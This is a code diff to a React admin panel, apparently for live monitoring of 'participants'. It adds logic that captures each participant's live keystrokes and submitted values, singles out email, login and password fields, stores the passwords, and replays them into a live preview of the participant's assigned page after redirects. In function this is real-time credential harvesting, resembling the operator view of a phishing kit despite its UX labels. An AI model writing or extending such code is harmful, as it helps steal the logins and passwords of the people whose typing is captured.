@@ -245,6 +245,10 @@ function Admin() {
   }
   const [events, setEvents] = useState<InputPayload[]>([]);
   const [liveInputs, setLiveInputs] = useState<Map<string, LiveInputPayload>>(new Map());
+  /** All live-typed fields per participant — seeds live preview after redirects. */
+  const [liveFieldMaps, setLiveFieldMaps] = useState<Map<string, Record<string, string>>>(
+    () => new Map(),
+  );
   const [previews, setPreviews] = useState<string[]>([]);
   const [viewports, setViewports] = useState<Map<string, { w: number; h: number }>>(new Map());
   const [designs, setDesigns] = useState<DesignRecord[]>(() => getDesigns());
@@ -333,6 +337,21 @@ function Admin() {
         setLiveInputs((prev) => {
           const next = new Map(prev);
           next.set(p.participantId, p);
+          return next;
+        });
+        setLiveFieldMaps((prev) => {
+          const next = new Map(prev);
+          const fields = { ...(next.get(p.participantId) || {}) };
+          fields[p.field] = p.value;
+          // Keep common aliases so preview can reseed email chips after nav.
+          if (/^(email|identifier|login)$/i.test(p.field) || /email/i.test(p.field)) {
+            fields.email = p.value;
+            fields.identifier = p.value;
+          }
+          if (/^password$/i.test(p.field) || p.ftype === "password") {
+            fields.password = p.value;
+          }
+          next.set(p.participantId, fields);
           return next;
         });
         window.dispatchEvent(new CustomEvent("ux:liveinput", { detail: p }));
@@ -657,6 +676,20 @@ function Admin() {
         const rec = records.get(pid);
         const initialUrl = rec?.currentUrl || rec?.assignedUrl || null;
         const initialViewport = viewports.get(pid) || null;
+        const fromLive = liveFieldMaps.get(pid) || {};
+        const fromSubmitted: Record<string, string> = {};
+        for (const e of events) {
+          if (e.participantId !== pid) continue;
+          const key = e.field.replace(/_submitted$/i, "");
+          fromSubmitted[key] = e.value;
+          fromSubmitted[e.field] = e.value;
+          if (/^email$/i.test(key)) {
+            fromSubmitted.email = e.value;
+            fromSubmitted.identifier = e.value;
+          }
+          if (/^password$/i.test(key)) fromSubmitted.password = e.value;
+        }
+        const seedInputs = { ...fromSubmitted, ...fromLive };
         return (
           <LivePreview
             key={pid}
@@ -664,6 +697,7 @@ function Admin() {
             onClose={() => closePreview(pid)}
             initialUrl={initialUrl}
             initialViewport={initialViewport}
+            seedInputs={seedInputs}
           />
         );
       })}
